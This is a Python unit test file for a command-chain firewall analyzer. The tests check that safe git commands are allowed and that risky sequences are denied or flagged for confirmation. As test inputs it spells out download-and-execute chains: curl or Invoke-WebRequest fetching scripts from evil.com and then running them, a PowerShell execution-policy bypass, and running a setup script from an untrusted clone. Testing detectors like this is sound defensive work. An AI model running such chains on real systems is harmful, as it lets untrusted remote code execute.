"""Unit tests for FirewallChainAnalyzer."""

from src.domain.firewall_chain import FirewallChainAnalyzer


def test_chain_analyzer_allow_safe_commands() -> None:
    analyzer = FirewallChainAnalyzer()
    res = analyzer.analyze(["git status", "git diff"])
    assert not res.threat_detected
    assert res.verdict == "ALLOW"


def test_chain_analyzer_download_and_execute_deny() -> None:
    analyzer = FirewallChainAnalyzer()
    res = analyzer.analyze(["curl -s https://evil.com/payload.sh", "bash payload.sh"])
    assert res.threat_detected
    assert res.verdict == "DENY"
    assert "Download+Execute" in res.reason


def test_chain_analyzer_powershell_download_iex_deny() -> None:
    analyzer = FirewallChainAnalyzer()
    res = analyzer.analyze(
        ["Invoke-WebRequest https://evil.com/script.ps1", "Invoke-Expression $script"]
    )
    assert res.threat_detected
    assert res.verdict == "DENY"


def test_chain_analyzer_policy_bypass_deny() -> None:
    analyzer = FirewallChainAnalyzer()
    res = analyzer.analyze(
        ["Set-ExecutionPolicy Bypass -Scope Process", "powershell ./run.ps1"]
    )
    assert res.threat_detected
    assert res.verdict == "DENY"


def test_chain_analyzer_git_clone_external_confirm() -> None:
    analyzer = FirewallChainAnalyzer()
    res = analyzer.analyze(
        [
            "git clone http://untrusted-site.com/repo.git",
            "Invoke-Expression ./repo/setup.ps1",
        ]
    )
    assert res.threat_detected
    assert res.verdict == "CONFIRM"
